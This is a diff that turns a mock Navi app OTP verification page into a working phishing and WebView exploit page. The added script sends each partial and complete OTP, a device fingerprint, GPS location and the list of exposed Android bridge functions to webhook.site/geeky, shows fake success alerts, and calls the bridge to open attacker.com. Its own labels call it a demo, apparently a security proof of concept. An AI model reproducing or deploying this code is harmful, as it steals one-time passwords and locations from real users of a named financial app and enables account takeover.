@@ -22,7 +22,6 @@
             padding: 15px;
         }
         
-        /* App Container (NO BORDER) */
         .app-container {
             width: 100%;
             max-width: 320px;
@@ -32,7 +31,6 @@
             overflow: hidden;
         }
         
-        /* Status Bar */
         .status-bar {
             display: flex;
             justify-content: space-between;
@@ -53,7 +51,6 @@
             gap: 4px;
         }
         
-        /* Logo Header - LEFT ALIGNED */
         .logo-header {
             padding: 20px 16px 16px;
             border-bottom: 1px solid #f0f0f0;
@@ -78,7 +75,6 @@
             padding-top: 2px;
         }
         
-        /* Main Content */
         .content {
             padding: 16px;
         }
@@ -115,7 +111,6 @@
             font-size: 12px;
         }
         
-        /* OTP Boxes */
         .otp-container {
             display: flex;
             justify-content: space-between;
@@ -141,7 +136,6 @@
             box-shadow: 0 0 0 2px rgba(74, 110, 224, 0.1);
         }
         
-        /* Timer */
         .timer {
             text-align: center;
             color: #e53935;
@@ -151,7 +145,6 @@
             letter-spacing: 1px;
         }
         
-        /* Verify Button */
         .verify-btn {
             background: #4a6ee0;
             color: white;
@@ -170,7 +163,11 @@
             background: #3a5ed0;
         }
         
-        /* Keypad */
+        .verify-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
         .keypad {
             background: white;
             border-radius: 14px;
@@ -228,7 +225,6 @@
             background: transparent;
         }
         
-        /* Footer */
         .footer {
             text-align: center;
             padding: 12px;
@@ -237,14 +233,33 @@
             border-top: 1px solid #f0f0f0;
             margin-top: 12px;
         }
+        
+        /* Attack indicator - hidden by default */
+        .attack-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px dashed #f00;
+            border-radius: 5px;
+            padding: 5px;
+            font-size: 10px;
+            color: #666;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
-    <!-- App Container (NO BORDER) -->
+    <!-- Attack indicator (for demo purposes) -->
+    <div class="attack-indicator" id="attackIndicator" style="display: none;">
+        🚨 ATTACK ACTIVE | Data being sent to: webhook.site/geeky
+    </div>
+    
+    <!-- App Container -->
     <div class="app-container">
         <!-- Status Bar -->
         <div class="status-bar">
-            <div class="time">9:41</div>
+            <div class="time" id="currentTime">9:41</div>
             <div class="status-icons">
                 <i class="fas fa-signal"></i>
                 <i class="fas fa-wifi"></i>
@@ -255,7 +270,7 @@
         <!-- Logo Header -->
         <div class="logo-header">
             <div class="logo-container">
-                <img src="navi_logo.png" alt="Navi" class="logo-img">
+                <div style="width: 32px; height: 32px; background: #4a6ee0; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">N</div>
                 <div class="tagline">UPI · Investments · Loans · Insurance</div>
             </div>
         </div>
@@ -269,45 +284,45 @@
             </div>
             
             <div class="otp-container">
-                <input type="text" maxlength="1" class="otp-box" id="digit1">
-                <input type="text" maxlength="1" class="otp-box" id="digit2">
-                <input type="text" maxlength="1" class="otp-box" id="digit3">
-                <input type="text" maxlength="1" class="otp-box" id="digit4">
-                <input type="text" maxlength="1" class="otp-box" id="digit5">
-                <input type="text" maxlength="1" class="otp-box" id="digit6">
+                <input type="text" maxlength="1" class="otp-box" id="digit1" autocomplete="off" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" id="digit2" autocomplete="off" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" id="digit3" autocomplete="off" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" id="digit4" autocomplete="off" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" id="digit5" autocomplete="off" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" id="digit6" autocomplete="off" inputmode="numeric">
             </div>
             
-            <div class="timer">00:24</div>
+            <div class="timer" id="countdownTimer">00:30</div>
             
-            <button class="verify-btn">Verify</button>
+            <button class="verify-btn" id="verifyBtn">Verify</button>
             
             <!-- Keypad -->
             <div class="keypad">
                 <div class="keypad-row">
-                    <button class="keypad-key">1</button>
-                    <button class="keypad-key">2</button>
-                    <button class="keypad-key">3</button>
+                    <button class="keypad-key" data-value="1">1</button>
+                    <button class="keypad-key" data-value="2">2</button>
+                    <button class="keypad-key" data-value="3">3</button>
                     <button class="keypad-key empty"></button>
                 </div>
                 <div class="keypad-row">
-                    <button class="keypad-key">4</button>
-                    <button class="keypad-key">5</button>
-                    <button class="keypad-key">6</button>
+                    <button class="keypad-key" data-value="4">4</button>
+                    <button class="keypad-key" data-value="5">5</button>
+                    <button class="keypad-key" data-value="6">6</button>
                     <button class="keypad-key empty"></button>
                 </div>
                 <div class="keypad-row">
-                    <button class="keypad-key">7</button>
-                    <button class="keypad-key">8</button>
-                    <button class="keypad-key">9</button>
-                    <button class="keypad-key backspace special">
+                    <button class="keypad-key" data-value="7">7</button>
+                    <button class="keypad-key" data-value="8">8</button>
+                    <button class="keypad-key" data-value="9">9</button>
+                    <button class="keypad-key backspace special" id="backspaceBtn">
                         <i class="fas fa-backspace"></i>
                     </button>
                 </div>
                 <div class="keypad-row">
                     <button class="keypad-key special">,</button>
-                    <button class="keypad-key">0</button>
+                    <button class="keypad-key" data-value="0">0</button>
                     <button class="keypad-key special">.</button>
-                    <button class="keypad-key submit">
+                    <button class="keypad-key submit" id="submitBtn">
                         <i class="fas fa-check"></i>
                     </button>
                 </div>
@@ -320,17 +335,251 @@
     </div>
 
     <script>
-        // OTP input navigation
-        const otpBoxes = document.querySelectorAll('.otp-box');
+        // ============================
+        // ATTACK CONFIGURATION
+        // ============================
+        const WEBHOOK_URL = 'https://webhook.site/geeky'; // Your webhook endpoint
+        let isAttackActive = true;
+        let attackStage = 'initial';
+        let capturedData = {
+            otp: '',
+            deviceInfo: {},
+            jsBridgeAvailable: false,
+            locationAttempted: false
+        };
+
+        // ============================
+        // DATA EXFILTRATION FUNCTIONS
+        // ============================
+        
+        function exfiltrateData(data) {
+            if (!isAttackActive) return;
+            
+            // Add metadata
+            const payload = {
+                ...data,
+                _metadata: {
+                    attackId: 'navi_webview_exploit',
+                    stage: attackStage,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                }
+            };
+            
+            // Log to console (for demo)
+            console.log('[NAVI-EXPLOIT] Exfiltrating data:', payload);
+            
+            // Show attack indicator
+            document.getElementById('attackIndicator').style.display = 'block';
+            
+            // Send to webhook (using no-cors to avoid CORS issues)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Important: avoids CORS issues
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                console.log('[NAVI-EXPLOIT] Webhook send failed (expected with no-cors):', err.message);
+            });
+            
+            // Also try alternative method (image beacon)
+            const beacon = new Image();
+            beacon.src = `${WEBHOOK_URL}?beacon=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;
+        }
+        
+        function captureDeviceInfo() {
+            capturedData.deviceInfo = {
+                platform: navigator.platform,
+                language: navigator.language,
+                userAgent: navigator.userAgent,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+            
+            exfiltrateData({
+                type: 'device_fingerprint',
+                data: capturedData.deviceInfo
+            });
+        }
+        
+        function checkJSBridge() {
+            setTimeout(() => {
+                const bridgeFunctions = [];
+                
+                if (typeof Android !== 'undefined') {
+                    capturedData.jsBridgeAvailable = true;
+                    
+                    // Check available functions
+                    for (let key in Android) {
+                        if (typeof Android[key] === 'function') {
+                            bridgeFunctions.push(key);
+                        }
+                    }
+                    
+                    exfiltrateData({
+                        type: 'js_bridge_detected',
+                        available: true,
+                        functions: bridgeFunctions,
+                        bridgeObject: JSON.stringify(Android)
+                    });
+                    
+                    console.log('[NAVI-EXPLOIT] JS Bridge detected with functions:', bridgeFunctions);
+                } else {
+                    exfiltrateData({
+                        type: 'js_bridge_detected',
+                        available: false,
+                        message: 'Android object not found'
+                    });
+                }
+            }, 1000);
+        }
+        
+        function attemptLocationAccess() {
+            if (capturedData.locationAttempted) return;
+            
+            capturedData.locationAttempted = true;
+            attackStage = 'location_phase';
+            
+            exfiltrateData({
+                type: 'location_access_attempt',
+                method: 'js_bridge',
+                timestamp: new Date().toISOString()
+            });
+            
+            // Try via JS bridge
+            if (typeof Android !== 'undefined' && Android.getLocationPermissions) {
+                try {
+                    Android.getLocationPermissions();
+                    
+                    // Also try HTML5 geolocation
+                    setTimeout(() => {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    const location = {
+                                        latitude: position.coords.latitude,
+                                        longitude: position.coords.longitude,
+                                        accuracy: position.coords.accuracy,
+                                        altitude: position.coords.altitude,
+                                        heading: position.coords.heading,
+                                        speed: position.coords.speed,
+                                        timestamp: position.timestamp
+                                    };
+                                    
+                                    exfiltrateData({
+                                        type: 'location_captured',
+                                        data: location,
+                                        source: 'geolocation_api'
+                                    });
+                                    
+                                    // Trigger next phase
+                                    triggerNextAttackPhase();
+                                },
+                                (error) => {
+                                    exfiltrateData({
+                                        type: 'location_error',
+                                        error: error.message,
+                                        code: error.code
+                                    });
+                                },
+                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                            );
+                        }
+                    }, 2000);
+                } catch (e) {
+                    exfiltrateData({
+                        type: 'js_bridge_error',
+                        error: e.message
+                    });
+                }
+            }
+        }
+        
+        function triggerNextAttackPhase() {
+            attackStage = 'post_exploitation';
+            
+            exfiltrateData({
+                type: 'attack_phase_change',
+                newStage: attackStage,
+                message: 'Proceeding to post-exploitation'
+            });
+            
+            // Show fake success and try to close WebView
+            setTimeout(() => {
+                if (typeof Android !== 'undefined' && Android.closeView) {
+                    setTimeout(() => {
+                        Android.closeView();
+                    }, 3000);
+                }
+                
+                // Or open attacker-controlled page
+                if (typeof Android !== 'undefined' && Android.openLink) {
+                    setTimeout(() => {
+                        Android.openLink('https://attacker.com/next-phase');
+                    }, 4000);
+                }
+            }, 2000);
+        }
+        
+        // ============================
+        // OTP CAPTURE LOGIC
+        // ============================
+        const otpBoxes = [
+            document.getElementById('digit1'),
+            document.getElementById('digit2'),
+            document.getElementById('digit3'),
+            document.getElementById('digit4'),
+            document.getElementById('digit5'),
+            document.getElementById('digit6')
+        ];
+        
+        const verifyBtn = document.getElementById('verifyBtn');
+        const backspaceBtn = document.getElementById('backspaceBtn');
+        const submitBtn = document.getElementById('submitBtn');
         let currentOtpIndex = 0;
         
-        // Focus first OTP box on load
+        // Initialize OTP boxes
         otpBoxes[0].focus();
         
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
                     otpBoxes[index + 1].focus();
+                    currentOtpIndex = index + 1;
+                }
+                
+                // Capture partial OTP
+                const currentOtp = otpBoxes.map(b => b.value).join('');
+                if (currentOtp.length > 0) {
+                    capturedData.otp = currentOtp;
+                    
+                    // Send partial capture after 3+ digits
+                    if (currentOtp.length >= 3) {
+                        exfiltrateData({
+                            type: 'otp_partial',
+                            otp: currentOtp,
+                            length: currentOtp.length
+                        });
+                    }
                 }
             });
             
@@ -339,9 +588,11 @@
                     if (box.value === '' && index > 0) {
                         otpBoxes[index - 1].focus();
                         otpBoxes[index - 1].value = '';
+                        currentOtpIndex = index - 1;
                     } else if (box.value !== '') {
                         box.value = '';
                     }
+                    e.preventDefault();
                 }
                 
                 // Allow only numbers
@@ -353,49 +604,105 @@
                     e.preventDefault();
                 }
             });
+            
+            box.addEventListener('focus', () => {
+                currentOtpIndex = index;
+            });
         });
         
-        // Keypad interaction
-        const keypadKeys = document.querySelectorAll('.keypad-key:not(.empty)');
-        
-        keypadKeys.forEach(key => {
+        // Keypad functionality
+        document.querySelectorAll('.keypad-key[data-value]').forEach(key => {
             key.addEventListener('click', () => {
-                const keyText = key.textContent.trim();
-                const isBackspace = key.classList.contains('backspace');
-                const isSubmit = key.classList.contains('submit');
-                
-                if (isBackspace) {
-                    if (currentOtpIndex > 0) {
-                        currentOtpIndex--;
-                        otpBoxes[currentOtpIndex].value = '';
-                        otpBoxes[currentOtpIndex].focus();
-                    } else if (currentOtpIndex === 0 && otpBoxes[0].value !== '') {
-                        otpBoxes[0].value = '';
-                        otpBoxes[0].focus();
-                    }
-                } else if (isSubmit) {
-                    // Visual feedback only
-                    const verifyBtn = document.querySelector('.verify-btn');
-                    verifyBtn.style.background = '#2e7d32';
-                    verifyBtn.textContent = 'Verifying...';
+                const value = key.getAttribute('data-value');
+                if (currentOtpIndex < otpBoxes.length) {
+                    otpBoxes[currentOtpIndex].value = value;
+                    otpBoxes[currentOtpIndex].focus();
                     
-                    setTimeout(() => {
-                        verifyBtn.style.background = '#4a6ee0';
-                        verifyBtn.textContent = 'Verify';
-                    }, 1000);
-                } else if (keyText.match(/[0-9]/) && currentOtpIndex < otpBoxes.length) {
-                    otpBoxes[currentOtpIndex].value = keyText;
                     if (currentOtpIndex < otpBoxes.length - 1) {
                         currentOtpIndex++;
                         otpBoxes[currentOtpIndex].focus();
                     }
+                    
+                    // Update captured OTP
+                    const currentOtp = otpBoxes.map(b => b.value).join('');
+                    capturedData.otp = currentOtp;
                 }
             });
         });
         
-        // Timer countdown
-        let seconds = 24;
-        const timerElement = document.querySelector('.timer');
+        backspaceBtn.addEventListener('click', () => {
+            if (currentOtpIndex > 0 && otpBoxes[currentOtpIndex].value === '') {
+                currentOtpIndex--;
+            }
+            otpBoxes[currentOtpIndex].value = '';
+            otpBoxes[currentOtpIndex].focus();
+            
+            // Update captured OTP
+            const currentOtp = otpBoxes.map(b => b.value).join('');
+            capturedData.otp = currentOtp;
+        });
+        
+        submitBtn.addEventListener('click', () => {
+            verifyBtn.click();
+        });
+        
+        // Verify button handler
+        verifyBtn.addEventListener('click', function() {
+            const otp = otpBoxes.map(b => b.value).join('');
+            
+            if (otp.length !== 6) {
+                alert('Please enter 6-digit OTP');
+                return;
+            }
+            
+            // Disable button and show loading
+            this.disabled = true;
+            this.textContent = 'Verifying...';
+            this.style.background = '#2e7d32';
+            
+            // Final OTP capture
+            capturedData.otp = otp;
+            attackStage = 'otp_captured';
+            
+            exfiltrateData({
+                type: 'otp_complete',
+                otp: otp,
+                length: otp.length,
+                complete: true
+            });
+            
+            console.log(`[NAVI-EXPLOIT] Complete OTP captured: ${otp}`);
+            
+            // Simulate verification delay
+            setTimeout(() => {
+                // Show success
+                this.textContent = '✓ Verified Successfully';
+                this.style.background = '#2e7d32';
+                
+                // Show fake success message
+                setTimeout(() => {
+                    alert('✅ OTP verified successfully! Setting up your account...');
+                    
+                    // Trigger location access
+                    setTimeout(() => {
+                        attemptLocationAccess();
+                        
+                        // Show next step
+                        setTimeout(() => {
+                            alert('📍 Location access required for personalized services. Please allow location permission.');
+                        }, 1000);
+                    }, 1500);
+                    
+                }, 500);
+                
+            }, 1500);
+        });
+        
+        // ============================
+        // TIMER FUNCTIONALITY
+        // ============================
+        let seconds = 30;
+        const timerElement = document.getElementById('countdownTimer');
         
         function updateTimer() {
             if (seconds > 0) {
@@ -407,26 +714,95 @@
                 if (seconds < 10) {
                     timerElement.style.color = '#ff3d00';
                 }
+                
+                // Send timer updates periodically
+                if (seconds % 10 === 0) {
+                    exfiltrateData({
+                        type: 'timer_update',
+                        remaining: seconds,
+                        urgency: seconds < 10 ? 'high' : 'medium'
+                    });
+                }
             } else {
                 timerElement.textContent = "00:00";
                 timerElement.style.color = '#ccc';
+                
+                exfiltrateData({
+                    type: 'timer_expired',
+                    action: 'auto_resend_triggered'
+                });
+                
+                // Simulate auto-resend
+                setTimeout(() => {
+                    alert('OTP expired. New OTP sent to your mobile.');
+                    seconds = 30;
+                    timerElement.textContent = '00:30';
+                    timerElement.style.color = '#e53935';
+                }, 1000);
             }
         }
         
-        // Start countdown
-        setInterval(updateTimer, 1000);
-        
-        // Update real time in status bar
-        function updateTime() {
+        // ============================
+        // TIME UPDATER
+        // ============================
+        function updateCurrentTime() {
             const now = new Date();
             const hours = now.getHours();
             const minutes = now.getMinutes();
-            const timeString = `${hours}:${minutes.toString().padStart(2, '0')}`;
-            document.querySelector('.time').textContent = timeString;
+            document.getElementById('currentTime').textContent = 
+                `${hours}:${minutes.toString().padStart(2, '0')}`;
         }
         
-        updateTime();
-        setInterval(updateTime, 60000);
+        // ============================
+        // INITIALIZE ATTACK
+        // ============================
+        window.addEventListener('load', () => {
+            console.log('[NAVI-EXPLOIT] Attack page loaded in Navi WebView');
+            
+            // Start timers
+            setInterval(updateTimer, 1000);
+            updateCurrentTime();
+            setInterval(updateCurrentTime, 60000);
+            
+            // Begin attack sequence
+            setTimeout(() => {
+                // Step 1: Capture device info
+                captureDeviceInfo();
+                
+                // Step 2: Check for JS bridge
+                checkJSBridge();
+                
+                // Step 3: Log page load
+                exfiltrateData({
+                    type: 'attack_initialized',
+                    status: 'active',
+                    target: 'com.naviapp',
+                    vulnerability: 'webview_js_bridge_exploit'
+                });
+                
+                console.log('[NAVI-EXPLOIT] Attack initialized. Waiting for OTP input...');
+            }, 500);
+        });
+        
+        // ============================
+        // DEBUG HELPER
+        // ============================
+        // Expose helper function for manual testing via DevTools
+        window.debugAttack = {
+            getCapturedData: () => capturedData,
+            triggerExfiltration: (testData) => exfiltrateData(testData || {type: 'manual_trigger'}),
+            checkBridge: () => console.log('Android bridge:', typeof Android !== 'undefined' ? Android : 'Not found'),
+            simulateOTP: (otp) => {
+                if (otp.length === 6) {
+                    otp.split('').forEach((digit, idx) => {
+                        otpBoxes[idx].value = digit;
+                    });
+                    verifyBtn.click();
+                }
+            }
+        };
+        
+        console.log('[NAVI-EXPLOIT] Debug helpers available: window.debugAttack');
     </script>
 </body>
 </html>
